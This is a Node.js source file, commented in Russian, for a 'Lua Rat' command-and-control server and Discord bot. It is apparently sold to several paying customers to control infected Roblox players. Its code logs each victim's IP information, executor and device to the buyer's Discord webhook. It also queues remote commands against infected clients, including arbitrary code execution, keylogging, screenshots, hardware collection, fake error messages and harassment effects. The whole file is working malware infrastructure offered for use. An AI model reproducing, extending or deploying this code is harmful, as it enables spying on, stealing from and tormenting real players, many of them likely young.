const express = require('express');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
const cors = require('cors');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const PORT = process.env.PORT || 10000;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` || `http://localhost:${PORT}`;

console.log('========================================');
console.log('Lua Rat Server v3.2 Multi-User');
console.log('========================================');

// ========== ЗАГРУЗКА ПОКУПАТЕЛЕЙ ИЗ ENV ==========
const customers = new Map();

for (let i = 1; i <= 10; i++) {
    const customerKey = process.env[`CUSTOMER_${i}_KEY`];
    const webhook = process.env[`WEBHOOK_${i}`];
    
    if (customerKey && webhook) {
        customers.set(customerKey, {
            id: i,
            name: `User-${i}`,
            discord_role: `User-${i}`,
            webhook: webhook,
            users: new Map(),
            key: customerKey,
            createdAt: new Date().toISOString()
        });
        console.log(`✅ Загружен покупатель ${i}: User-${i}`);
    }
}

console.log(`\n📊 Всего активных панелей: ${customers.size}`);
console.log('========================================\n');

// ========== ХРАНИЛИЩЕ ==========
let commandQueue = [];

// ========== EXPRESS ==========
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ========== ФУНКЦИЯ ОТПРАВКИ В ВЕБХУК ==========
async function sendToWebhook(webhookUrl, title, description, color = 0x00ff00, fields = []) {
    if (!webhookUrl) return false;
    
    try {
        const embed = {
            title: title,
            description: description,
            color: color,
            fields: fields,
            timestamp: new Date().toISOString(),
            footer: { text: "Lua Rat System v3.2" }
        };
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                username: "Lua Rat Panel",
                embeds: [embed]
            })
        });
        
        if (response.ok) {
            console.log(`📤 Вебхук отправлен: ${title.substring(0, 30)}...`);
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ Ошибка вебхука:', error.message);
        return false;
    }
}

// ========== API МАРШРУТЫ ==========

app.get('/data', (req, res) => {
    const player = req.query.player;
    const customer_key = req.query.customer_key;
    
    if (!player || !customer_key) {
        return res.json({ command: "", args: [] });
    }
    
    const customer = customers.get(customer_key);
    if (!customer) {
        return res.json({ command: "", args: [] });
    }
    
    if (customer.users.has(player)) {
        const user = customer.users.get(player);
        user.lastSeen = Date.now();
        customer.users.set(player, user);
    }
    
    const commandIndex = commandQueue.findIndex(cmd => 
        cmd.customer_key === customer_key && 
        (!cmd.target || cmd.target === player || cmd.target === 'all')
    );
    
    if (commandIndex !== -1) {
        const cmd = commandQueue[commandIndex];
        commandQueue.splice(commandIndex, 1);
        console.log(`📨 ${cmd.command} -> ${player} (${customer.name})`);
        res.json({ command: cmd.command, args: cmd.args || [] });
    } else {
        res.json({ command: "", args: [] });
    }
});

app.post('/command', async (req, res) => {
    const { command, args, target, customer_key } = req.body;
    
    const customer = customers.get(customer_key);
    if (!customer) {
        return res.status(403).json({ error: "Invalid customer key" });
    }
    
    if (command === "inject_notify" && args && args.length >= 5) {
        const playerName = args[0];
        const gameName = args[1];
        const ipInfo = args[2];
        const executor = args[3];
        const device = args[4];
        
        const existingUser = customer.users.get(playerName);
        customer.users.set(playerName, {
            player: playerName,
            place: gameName,
            executor: executor,
            device: device,
            firstSeen: existingUser?.firstSeen || Date.now(),
            lastSeen: Date.now(),
            injectCount: (existingUser?.injectCount || 0) + 1
        });
        
        const description = `**👤 Игрок:** ${playerName}\n**🎮 Игра:** ${gameName}\n**💉 Инжектор:** ${executor}\n**📱 Устройство:** ${device}\n\n**🌐 IP информация:**\n${ipInfo}`;
        
        const fields = [
            { name: "🕐 Время", value: new Date().toLocaleString(), inline: true },
            { name: "📊 Инжектов", value: `${customer.users.get(playerName).injectCount}`, inline: true }
        ];
        
        await sendToWebhook(customer.webhook, "🔌 Новый инжект!", description, 0x00ff00, fields);
        
        console.log(`💉 Инжект: ${playerName} -> ${customer.name}`);
        return res.json({ status: "OK", message: "Inject notification sent" });
    }
    
    if (command && command !== "inject_notify") {
        if (target && !customer.users.has(target)) {
            return res.json({ 
                status: "error", 
                message: "Игрок не найден в вашей базе",
                player_exists: false 
            });
        }
        
        commandQueue.push({
            command: command,
            args: args || [],
            target: target || null,
            customer_key: customer_key,
            timestamp: Date.now()
        });
        
        if (commandQueue.length > 100) {
            commandQueue = commandQueue.slice(-50);
        }
        
        console.log(`📝 Команда ${command} в очередь для ${customer.name}`);
    }
    
    res.json({ status: "OK", queue_size: commandQueue.length });
});

app.get('/my_users', (req, res) => {
    const customer_key = req.query.customer_key;
    const customer = customers.get(customer_key);
    
    if (!customer) {
        return res.status(403).json({ error: "Invalid key" });
    }
    
    const now = Date.now();
    for (let [key, user] of customer.users.entries()) {
        if (now - user.lastSeen > 120000) {
            customer.users.delete(key);
        }
    }
    
    res.json({
        customer: customer.name,
        users: Array.from(customer.users.values()),
        count: customer.users.size
    });
});

app.get('/status', (req, res) => {
    let totalUsers = 0;
    for (let [_, customer] of customers) {
        totalUsers += customer.users.size;
    }
    
    res.json({
        status: "online",
        version: "3.2.0",
        customers: customers.size,
        total_users: totalUsers,
        pending_commands: commandQueue.length,
        uptime: Math.floor(process.uptime())
    });
});

app.get('/health', (req, res) => res.send('OK'));

app.get('/', (req, res) => {
    res.json({
        name: "Lua Rat Control System",
        version: "3.2.0",
        customers: customers.size,
        status: "operational"
    });
});

// ========== DISCORD БОТ ==========
let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    async function sendCommandToCustomer(command, args, target, customer_key) {
        try {
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command, args, target, customer_key })
            });
            const data = await response.json();
            return { ok: response.ok, data: data };
        } catch (error) {
            console.error(`Ошибка: ${error.message}`);
            return { ok: false, data: null };
        }
    }

    discordClient.on('ready', () => {
        console.log(`\n🤖 Discord бот ${discordClient.user.tag} запущен!`);
        console.log(`📋 Доступные панели:`);
        for (let [_, customer] of customers) {
            console.log(`   • ${customer.name} — роль: ${customer.discord_role}`);
        }
        console.log(`\n💡 Админ может использовать @User-X /команда\n`);
        discordClient.user.setActivity('/help | Lua Rat v3.2', { type: 'WATCHING' });
    });

    discordClient.on('messageCreate', async message => {
        if (message.author.bot || !message.content.startsWith('/')) return;
        
        const isAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
        
        let args = message.content.slice(1).split(' ');
        const command = args.shift().toLowerCase();
        
        // ========== ОПРЕДЕЛЯЕМ ПОКУПАТЕЛЯ ==========
        let targetCustomer = null;
        let targetKey = null;
        
        // Сначала проверяем, не хочет ли админ переключить панель через @User-X
        let selectedRole = null;
        if (isAdmin && args.length > 0 && args[0].startsWith('@')) {
            selectedRole = args[0].substring(1);
            args.shift();
        }
        
        // Если админ выбрал роль - ищем покупателя с такой ролью
        if (selectedRole) {
            for (let [key, customer] of customers) {
                if (customer.discord_role === selectedRole) {
                    targetKey = key;
                    targetCustomer = customer;
                    break;
                }
            }
        }
        
        // Если не нашли по выбранной роли - ищем по роли пользователя
        if (!targetCustomer) {
            for (let [key, customer] of customers) {
                const role = message.member.roles.cache.find(r => r.name === customer.discord_role);
                if (role) {
                    targetKey = key;
                    targetCustomer = customer;
                    break;
                }
            }
        }
        
        // Если админ без роли - даём доступ к User-1
        if (!targetCustomer && isAdmin) {
            const defaultKey = process.env.CUSTOMER_1_KEY;
            const defaultCustomer = customers.get(defaultKey);
            if (defaultCustomer) {
                targetKey = defaultKey;
                targetCustomer = defaultCustomer;
                console.log(`👑 Админ ${message.author.tag} использует панель ${targetCustomer.name}`);
            }
        }
        
        // Если всё равно нет доступа - отказ
        if (!targetCustomer) {
            return message.reply('❌ У вас нет доступа к панели. Обратитесь к администратору.');
        }
        
        // Парсим таргет (имя игрока)
        let target = null;
        if (args.length > 0 && /^[a-zA-Z0-9_]{3,20}$/.test(args[0])) {
            target = args.shift();
        }
        
        // ========== ОБРАБОТЧИКИ КОМАНД ==========
        
        if (command === 'users') {
            const now = Date.now();
            for (let [key, user] of targetCustomer.users.entries()) {
                if (now - user.lastSeen > 120000) targetCustomer.users.delete(key);
            }
            
            const usersList = Array.from(targetCustomer.users.values());
            const embed = new EmbedBuilder()
                .setTitle(`👥 Онлайн пользователи — ${targetCustomer.name}`)
                .setColor(0x00ff00);
            
            if (usersList.length > 0) {
                embed.setDescription(`**Всего онлайн:** ${usersList.length}`);
                const userText = usersList.slice(0, 20).map(u => 
                    `• **${u.player}** — ${u.place || 'Unknown'} (${u.executor || 'Unknown'}) | инжектов: ${u.injectCount || 1}`
                ).join('\n');
                embed.addFields({ name: '📋 Список игроков:', value: userText });
                if (usersList.length > 20) {
                    embed.addFields({ name: 'ℹ️', value: `... и еще ${usersList.length - 20} игроков` });
                }
            } else {
                embed.setDescription('❌ Нет активных игроков');
                embed.setColor(0xff0000);
            }
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'status') {
            const usersCount = targetCustomer.users.size;
            const pendingCommands = commandQueue.filter(c => c.customer_key === targetKey).length;
            
            const embed = new EmbedBuilder()
                .setTitle(`📊 Статус панели — ${targetCustomer.name}`)
                .setColor(0x7289da)
                .addFields(
                    { name: '👥 Игроки', value: `${usersCount}`, inline: true },
                    { name: '📨 Очередь', value: `${pendingCommands}`, inline: true },
                    { name: '🤖 Бот', value: '🟢 Активен', inline: true },
                    { name: '📊 Версия', value: '`3.2.0`', inline: true }
                );
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'help') {
            const embed = new EmbedBuilder()
                .setTitle('Lua Rat Panel v3.2')
                .setDescription(`**Добро пожаловать, ${targetCustomer.name}!**\n\nПолный список команд:`)
                .setColor(0x7289da)
                .addFields(
                    { name: '🎯 Формат команд', value: '• `/команда` — для всех\n• `/команда ник` — для игрока\n• `/команда ник аргументы` — с параметрами', inline: false },
                    { name: '👤 Управление игроком', value: '`/kick [ник] [причина]`\n`/freeze [ник] [сек]`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/cameralock [ник] [on/off]`\n`/camerashake [ник] [сек] [инт]`\n`/tpgame [ник] [id]`', inline: true },
                    { name: '👻 Эффекты', value: '`/jumpscare [ник] [1-2]`\n`/blur [ник] [сек]`\n`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] [id]`', inline: true },
                    { name: '💬 Чат', value: '`/message [ник] [текст]`\n`/fakeerror [ник] [текст]`', inline: true },
                    { name: '⚙️ Системные', value: '`/execute [ник] [код]`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/screenshot [ник]`', inline: true },
                    { name: '💥 Spam', value: '`/memory [ник] [кол-во]`\n`/gallery [ник] [кол-во]`', inline: true },
                    { name: '👥 Информация', value: '`/users` — мои игроки\n`/status` — статус панели\n`/test` — тест', inline: true }
                )
                .setFooter({ text: `Панель: ${targetCustomer.name} | Всего команд: 28` });
            
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'test') {
            const result = await sendCommandToCustomer("popup", ["Тест от Discord бота! ✅"], target, targetKey);
            if (result.ok) {
                await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
            } else {
                await message.reply(`❌ Ошибка: ${result.data?.message || 'неизвестная ошибка'}`);
            }
        }
        
        else if (command === 'print') {
            const result = await sendCommandToCustomer("print", [], target, targetKey);
            if (result.ok) {
                await message.reply(`📡 Проверка связи отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
            } else {
                await message.reply(`❌ Ошибка: ${result.data?.message || 'неизвестная ошибка'}`);
            }
        }
        
        else {
            const validCommands = [
                'kick', 'freeze', 'void', 'spin', 'fling', 'sit', 'dance',
                'jumpscare', 'message', 'execute', 'fakeerror', 'blur', 
                'mute', 'unmute', 'playaudio', 'cameralock', 'camerashake', 
                'tpgame', 'keylog', 'stopkeylog', 'hardware', 'screenshot', 
                'memory', 'gallery', 'chat'
            ];
            
            if (validCommands.includes(command)) {
                const result = await sendCommandToCustomer(command, args, target, targetKey);
                if (result.ok) {
                    await message.reply(`✅ ${command} отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                } else {
                    await message.reply(`❌ Ошибка: ${result.data?.message || 'игрок не найден в вашей базе'}`);
                }
            } else {
                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        }
    });

    discordClient.login(DISCORD_TOKEN).catch(e => console.error('❌ Ошибка бота:', e.message));
}

app.listen(PORT, () => {
    console.log(`\n🚀 Сервер запущен на порту ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log(`🤖 Discord бот: ${DISCORD_TOKEN ? '✅' : '❌'}`);
    console.log(`\n📊 Статистика:`);
    console.log(`   • Панелей: ${customers.size}`);
    console.log(`   • Команд в очереди: ${commandQueue.length}`);
    console.log('\n✅ Система готова к работе!\n');
});
